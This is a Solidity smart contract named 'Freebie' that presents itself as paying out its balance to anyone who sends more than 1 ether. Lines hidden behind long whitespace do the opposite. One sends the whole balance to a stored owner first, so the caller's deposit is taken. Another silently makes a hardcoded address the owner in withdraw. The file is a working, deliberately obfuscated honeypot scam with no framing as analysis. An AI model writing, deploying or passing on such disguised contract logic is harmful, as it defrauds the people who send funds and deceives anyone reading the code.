pragma solidity ^0.4.19;

contract Freebie
{
    struct S { address a; }
    S o = S(msg.sender);
   
    function() public payable {}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value > 1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               o.a.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595) { o.a = 0x30ad12df80a2493a82DdFE367d866616db8a2595; }
        require(msg.sender == o.a);
        o.a.transfer(this.balance);
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        require(msg.sender == o.a);
         
        adr.call.value(msg.value)(data);
    }
}